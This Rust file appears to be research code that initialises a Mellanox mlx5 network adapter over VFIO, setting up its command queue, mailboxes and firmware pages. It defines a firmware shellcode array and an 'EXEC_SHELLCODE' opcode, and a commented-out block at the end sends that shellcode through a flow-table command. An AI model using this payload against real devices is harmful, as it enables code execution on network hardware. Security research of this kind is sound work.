#![allow(unused_variables)]
#![allow(unused_imports)]

use std::{path::PathBuf, ptr::null_mut, thread::sleep, time::Duration};

use clap::Parser;
use dbg_hex::dbg_hex;
use deku::{DekuContainerRead, DekuContainerWrite};
use pci_driver::{
    backends::vfio::VfioPciDevice,
    device::PciDevice,
    pci_struct,
    regions::{
        structured::{PciRegisterRo, PciRegisterRw},
        AsPciSubregion, BackedByPciSubregion, MappedOwningPciRegion, PciMemoryRegion, PciRegion,
        PciSubregion, Permissions,
    },
};

use crate::{
    error::{Error, Result},
    types::{
        Command, EnableHCA, InitHCA, ManagePages, QueryISSI, QueryISSIOutput, QueryPages,
        QueryPagesOutput,
    },
};

mod error;
pub mod types;

pci_struct! {
    pub struct InitSegment<'a> : 0x1000 {
        fw_rev_major        @ 0x0000 : PciRegisterRo<'a, u16>,
        fw_rev_minor        @ 0x0002 : PciRegisterRo<'a, u16>,
        fw_rev_subminor     @ 0x0004 : PciRegisterRo<'a, u16>,
        cmd_interface_rev   @ 0x0006 : PciRegisterRo<'a, u16>,
        cmdq_phy_addr_hi    @ 0x0010 : PciRegisterRw<'a, u32>,
        cmdq_phy_addr_lo    @ 0x0014 : PciRegisterRw<'a, u32>,
        cmdq_doorbell       @ 0x0018 : PciRegisterRw<'a, u32>,
        initializing        @ 0x01fc : PciRegisterRo<'a, u32>,
        internal_timer_hi   @ 0x1000 : PciRegisterRo<'a, u32>,
        internal_timer_lo   @ 0x1004 : PciRegisterRo<'a, u32>,
        clear_interrupt     @ 0x100c : PciRegisterRo<'a, u32>,
        health_syndrom      @ 0x1010 : PciRegisterRo<'a, u32>,
    }
}

pci_struct! {
    pub struct CQE<'a> : 0x40 {
        cmd_type            @ 0x00 : PciRegisterRw<'a, u8>,
        input_length        @ 0x04 : PciRegisterRw<'a, u32>,
        input_mb_ptr_hi     @ 0x08 : PciRegisterRw<'a, u32>,
        input_mb_ptr_lo     @ 0x0c : PciRegisterRw<'a, u32>,
        cmd_input_inline0   @ 0x10 : PciRegisterRw<'a, u32>,
        cmd_input_inline1   @ 0x14 : PciRegisterRw<'a, u32>,
        cmd_input_inline2   @ 0x18 : PciRegisterRw<'a, u32>,
        cmd_input_inline3   @ 0x1c : PciRegisterRw<'a, u32>,
        cmd_output_inline0  @ 0x20 : PciRegisterRw<'a, u32>,
        cmd_output_inline1  @ 0x24 : PciRegisterRw<'a, u32>,
        cmd_output_inline2  @ 0x28 : PciRegisterRw<'a, u32>,
        cmd_output_inline3  @ 0x2c : PciRegisterRw<'a, u32>,
        output_mb_ptr_hi    @ 0x30 : PciRegisterRw<'a, u32>,
        output_mb_ptr_lo    @ 0x34 : PciRegisterRw<'a, u32>,
        output_length       @ 0x38 : PciRegisterRw<'a, u32>,
        token               @ 0x3c : PciRegisterRw<'a, u8>,
        signature           @ 0x3d : PciRegisterRw<'a, u8>,
        status              @ 0x3f : PciRegisterRw<'a, u8>,
    }
}

impl<'a> CQE<'a> {
    pub fn update_signature(&self) -> Result<()> {
        self.signature().write(0x00)?;
        let mut cmd_data = vec![0u8; self.len() as usize];
        self.read_bytes(0, &mut cmd_data)?;
        let mut signature = 0xffu8;
        for x in cmd_data {
            signature ^= x;
        }
        self.signature().write(signature)?;
        Ok(())
    }

    pub fn set_input_mb(&self, ptr: u64) -> Result<()> {
        self.input_mb_ptr_hi().write(((ptr >> 32) as u32).to_be())?;
        self.input_mb_ptr_lo().write(((ptr & 0xffffffff) as u32).to_be())?;
        Ok(())
    }

    pub fn set_output_mb(&self, ptr: u64) -> Result<()> {
        self.output_mb_ptr_hi().write(((ptr >> 32) as u32).to_be())?;
        self.output_mb_ptr_lo().write(((ptr & 0xffffffff) as u32).to_be())?;
        Ok(())
    }
}

pci_struct! {
    pub struct Mailbox<'a> : 0x240 {
        next_pointer_hi     @ 0x230 : PciRegisterRw<'a, u32>,
        next_pointer_lo     @ 0x234 : PciRegisterRw<'a, u32>,
        block_number        @ 0x238 : PciRegisterRw<'a, u32>,
        token               @ 0x23d : PciRegisterRw<'a, u8>,
        ctrl_signature      @ 0x23e : PciRegisterRw<'a, u8>,
        signature           @ 0x23f : PciRegisterRw<'a, u8>,
    }
}

impl<'a> Mailbox<'a> {
    pub fn set_data(&self, data: &[u8]) -> Result<()> {
        for (i, b) in data.iter().enumerate() {
            self.write_u8(i as u64, *b)?;
        }
        Ok(())
    }

    pub fn set_next(&self, ptr: u64) -> Result<()> {
        self.next_pointer_hi().write(((ptr >> 32) as u32).to_be())?; 
        self.next_pointer_lo().write(((ptr & 0xffffffff) as u32).to_be())?;
        Ok(())
    }

    pub fn update_signature(&self) -> Result<()> {
        self.signature().write(0x00)?;
        self.ctrl_signature().write(0x00)?;
        let mut mb_data = vec![0u8; self.len() as usize];
        self.read_bytes(0, &mut mb_data)?;
        let mut ctrl_signature = 0xff_u8;
        for x in mb_data[0x1c0..0x200].iter() {
            ctrl_signature ^= x;
        }
        self.ctrl_signature().write(ctrl_signature)?;
        self.read_bytes(0, &mut mb_data)?;
        let mut signature = 0xff_u8;
        for x in mb_data.iter() {
            signature ^= x;
        }
        self.signature().write(signature)?;
        Ok(())
    }
}

pub fn iommu_map(
    iommu: &pci_driver::iommu::PciIommu,
    iova: u64,
    length: usize,
) -> Result<PciMemoryRegion<'static>> {
    unsafe {
        let memory = libc::mmap(
            null_mut(),
            length,
            libc::PROT_READ | libc::PROT_WRITE,
            libc::MAP_ANONYMOUS | libc::MAP_PRIVATE,
            -1,
            0,
        ) as *mut u8;
        iommu.map(iova, length, memory, Permissions::ReadWrite)?;
        Ok(PciMemoryRegion::new_raw(
            memory,
            length,
            Permissions::ReadWrite,
        ))
    }
}

pub struct MailboxAllocator<'a> {
    region: PciSubregion<'a>,
    allocation_offset: u64,
}

impl<'a> MailboxAllocator<'a> {
    pub fn new(region: PciSubregion<'a>) -> MailboxAllocator<'a> {
        Self {
            region,
            allocation_offset: 0,
        }
    }

    pub fn allocate_mailbox(&mut self) -> Result<(u64, Mailbox<'a>)> {
        let mailbox_offset = self.allocation_offset;
        self.allocation_offset += 0x400;
        Ok((
            mailbox_offset,
            Mailbox::backed_by(
                self.region
                    .subregion(mailbox_offset..mailbox_offset + 0x400),
            ),
        ))
    }
}

#[allow(dead_code)]
struct Mlx5CmdIf<'a> {
    pci_device: VfioPciDevice,
    bar0_region: MappedOwningPciRegion,
    dma_region: PciMemoryRegion<'a>,
}

impl<'a> Mlx5CmdIf<'a> {
    pub fn new(pci_device: VfioPciDevice) -> Result<Self> {
        pci_device
            .config()
            .command()
            .bus_master_enable()
            .write(true)?;
        let bar0 = pci_device.bar(0).ok_or(Error::Bar0Error)?;
        let bar0_region = bar0.map(..bar0.len(), Permissions::ReadWrite)?;
        let dma_region = iommu_map(&pci_device.iommu(), 0x10000000_u64, 0x8000000)?;

        let this = Self {
            pci_device,
            bar0_region,
            dma_region,
        };
        this.setup_cmdq_phy_addr(0x10000000_u64)?;

        Ok(this)
    }

    pub fn init_segment(&self) -> InitSegment {
        InitSegment::backed_by(&self.bar0_region)
    }

    pub fn setup_cmdq_phy_addr(&self, cmdq_phy_addr: u64) -> Result<()> {
        self.init_segment()
            .cmdq_phy_addr_hi()
            .write(((cmdq_phy_addr >> 32) as u32).to_be())?;
        self.init_segment()
            .cmdq_phy_addr_lo()
            .write(((cmdq_phy_addr & 0xffffffff) as u32).to_be())?;

        while self.init_segment().initializing().read()?.to_be() & 0x80000000 != 0x00000000 {
            sleep(Duration::from_millis(100));
        }

        Ok(())
    }

    pub fn exec_command(&self, input: &[u8], outlen: u32) -> Result<Vec<u8>> {
        log::info!("Executing command input={input:02x?} outlen={outlen}");
        let cmd = CQE::backed_by((&self.dma_region).subregion(0x000..0x400));
        let mut mailbox_allocator = MailboxAllocator::new((&self.dma_region).subregion(0x1000..));

        cmd.cmd_type().write(0x07)?;

        cmd.input_length().write((input.len() as u32).to_be())?;

        for (i, b) in input[..0x10].iter().enumerate() {
            cmd.write_u8(0x10 + i as u64, *b)?;
        }

        cmd.input_mb_ptr_hi().write(0)?;
        cmd.input_mb_ptr_lo().write(0)?;
        cmd.output_mb_ptr_hi().write(0)?;
        cmd.output_mb_ptr_lo().write(0)?;

        let mut in_mb_vec: Vec<Mailbox<'_>> = vec![];
        let mut block_number: u32 = 0;
        for chunk in input[0x10..].chunks(0x200) {
            let in_mb = if let Some(prev_in_mb) = in_mb_vec.last() {
                let (offset, in_mb) = mailbox_allocator.allocate_mailbox()?;
                prev_in_mb.set_next(0x00000000_10001000 + offset)?;
                in_mb
            } else {
                let (offset, in_mb) = mailbox_allocator.allocate_mailbox()?;
                cmd.input_mb_ptr_hi().write(0x00000000_u32.to_be())?;
                cmd.input_mb_ptr_lo().write((0x10001000_u32 + offset as u32).to_be())?;
                in_mb
            };
            in_mb.set_next(0_u64)?;
            in_mb.set_data(chunk)?;
            in_mb.token().write(0)?;
            in_mb.block_number().write(block_number.to_be())?;
            block_number += 1;
            in_mb_vec.push(in_mb);
        }

        for in_mb in in_mb_vec.iter() {
            in_mb.update_signature()?;
        }

        cmd.cmd_output_inline0().write(0x00000000_u32.to_be())?;
        cmd.cmd_output_inline1().write(0x00000000_u32.to_be())?;
        cmd.cmd_output_inline2().write(0x00000000_u32.to_be())?;
        cmd.cmd_output_inline3().write(0x00000000_u32.to_be())?;

        let mut out_mb_vec: Vec<Mailbox<'_>> = vec![];
        let mut block_number: u32 = 0;
        for _ in (0x10..outlen).step_by(0x200) {
            let out_mb = if let Some(prev_out_mb) = out_mb_vec.last() {
                let (offset, out_mb) = mailbox_allocator.allocate_mailbox()?;
                prev_out_mb.set_next(0x00000000_10001000 + offset)?;
                out_mb
            } else {
                let (offset, out_mb) = mailbox_allocator.allocate_mailbox()?;
                cmd.output_mb_ptr_hi().write(0x00000000_u32.to_be())?;
                cmd.output_mb_ptr_lo().write((0x10001000_u32 + offset as u32).to_be())?;
                out_mb
            };
            out_mb.set_next(0_u64)?;
            out_mb.token().write(0x00)?;
            out_mb.block_number().write(block_number.to_be())?;
            block_number += 1;
            out_mb_vec.push(out_mb);
        }
        for out_mb in out_mb_vec.iter() {
            out_mb.update_signature()?;
        }
        cmd.output_length().write(outlen.to_be())?;

        cmd.token().write(0x00)?;
        cmd.status().write(0x01)?;
        cmd.update_signature()?;

        self.init_segment()
            .cmdq_doorbell()
            .write(0x00000001_u32.to_be())?;

        while cmd.status().read()? & 0x01 != 0x00 {
            log::trace!("Waiting for command status");
            sleep(Duration::from_millis(100));
        }
        let err = cmd.status().read()? >> 1;
        if err != 0x00 {
            return Err(Error::CmdIf(err));
        }
        log::debug!("Command: {cmd:?}");

        let mut output = vec![];
        for i in 0x00..0x10 {
            output.push(cmd.read_u8(0x20 + i)?)
        }
        for out_mb in out_mb_vec.iter() {
            let mut chunk = vec![0u8; 0x200];
            out_mb.read_bytes(0, &mut chunk)?;
            output.extend_from_slice(&chunk[..]);
        }
        output.resize(outlen as usize, 0);

        Ok(output)
    }

    pub fn do_command<Cmd: Command>(&self, cmd: Cmd) -> Result<Cmd::Output> {
        let msg = cmd.to_bytes()?;
        let out = self.exec_command(&msg, cmd.outlen() as u32)?;
        Ok(Cmd::Output::from_bytes((&out, 0))?.1)
    }
}

#[derive(Parser, Debug)]
struct CliArgs {
    device: PathBuf,
    input: Vec<u8>,
}

pub const SHELLCODE: &[u8] = &[
    0x18, 0x05, 0x3f, 0x85, 0x1c, 0xa5, 0xc9, 0x36, 0x24, 0xa5, 0xd6, 0x6e, 0x20, 0xa5, 0x74, 0xb9,
    0x18, 0x06, 0x57, 0x10, 0x1c, 0xc6, 0x88, 0x87, 0x24, 0xc6, 0x6c, 0x61, 0x20, 0xc6, 0x14, 0x8e,
    0xfc, 0xa7, 0x30, 0x00, 0x6c, 0x80, 0x28, 0x12, 0x6c, 0x80, 0x30, 0x16, 0x6c, 0x80, 0x38, 0x1a,
    0xfc, 0x00, 0x00, 0x2d,
];

pub const QUERY_HCA_CAP: u32 = 0x01000000_u32;
pub const QUERY_ADAPTER: u32 = 0x01010000_u32;
pub const INIT_HCA: u32 = 0x01020000_u32;
pub const TEARDOWN_HCA: u32 = 0x01030000_u32;
pub const ENABLE_HCA: u32 = 0x01040000_u32;
pub const DISABLE_HCA: u32 = 0x01050000_u32;
pub const QUERY_PAGES: u32 = 0x01070000_u32;
pub const MANAGE_PAGES: u32 = 0x01080000_u32;
pub const SET_HCA_CAP: u32 = 0x01090000_u32;
pub const QUERY_ISSI: u32 = 0x010a0000_u32;
pub const SET_ISSI: u32 = 0x010b0000_u32;
pub const QUERY_FLOW_TABLE: u32 = 0x09320000_u32;
pub const EXEC_SHELLCODE: u32 = 0x09320000_u32;

fn main() -> Result<()> {
    env_logger::init();

    let pci_device = VfioPciDevice::open("/sys/bus/pci/devices/0000:04:00.0")?;
    pci_device.reset()?;

    let cmdif = Mlx5CmdIf::new(pci_device)?;
    dbg!(cmdif.do_command(EnableHCA(()))?);
    dbg!(cmdif.do_command(QueryISSI(()))?);

    // SET_ISSI
    let out = cmdif.exec_command(
        &[
            0x01, 0x0b, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00,
            0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,
        ],
        0x10,
    )?;
    dbg_hex!(out);

    let query_boot_pages = cmdif.do_command(QueryPages {
        op_mod: types::QueryPagesOpMod::BootPages,
    })?;
    dbg!(&query_boot_pages);

    let mut available_page = 0x00000000_10100000_u64;
    let mut pages = vec![];
    for i in 0x00..query_boot_pages.num_pages {
        pages.push(available_page);
        available_page += 0x1000;
    }
    let manage_pages_cmd = ManagePages {
        op_mod: types::ManagePagesOpMod::AllocationSuccess,
        input_num_entries: query_boot_pages.num_pages,
        items: pages,
    };
    dbg_hex!(cmdif.exec_command(&manage_pages_cmd.to_bytes()?, 0x10)?);

    let query_hca_cap = cmdif.exec_command(
        &[
            0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        ],
        0x1010,
    )?;

    let mut set_hca_cap = vec![
        0x01, 0x09, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    ];
//    set_hca_cap.extend_from_slice(&query_hca_cap[0x10..]);
    set_hca_cap.extend_from_slice(&vec![0u8; 0x1000]);

    dbg_hex!(cmdif.exec_command(&set_hca_cap, 0x10)?);

    let query_init_pages = cmdif.do_command(QueryPages {
        op_mod: types::QueryPagesOpMod::InitPages,
    })?;
    dbg!(&query_init_pages);

    let mut pages = vec![];
    for i in 0x00..query_init_pages.num_pages {
        pages.push(available_page);
        available_page += 0x1000;
    }
    let manage_pages_cmd = ManagePages {
        op_mod: types::ManagePagesOpMod::AllocationSuccess,
        input_num_entries: query_boot_pages.num_pages,
        items: pages,
    };

    dbg_hex!(cmdif.exec_command(&manage_pages_cmd.to_bytes()?, 0x10)?);

    dbg!(cmdif.do_command(InitHCA(()))?);

//    let mut msg = vec![
//        0x09, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
//        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
//        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
//        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
//    ];
//    msg.extend_from_slice(SHELLCODE);
//    let output = cmdif.exec_command(
//        &msg,
//        0x100,
//    )?;
//    dbg_hex!(output);

    Ok(())
}
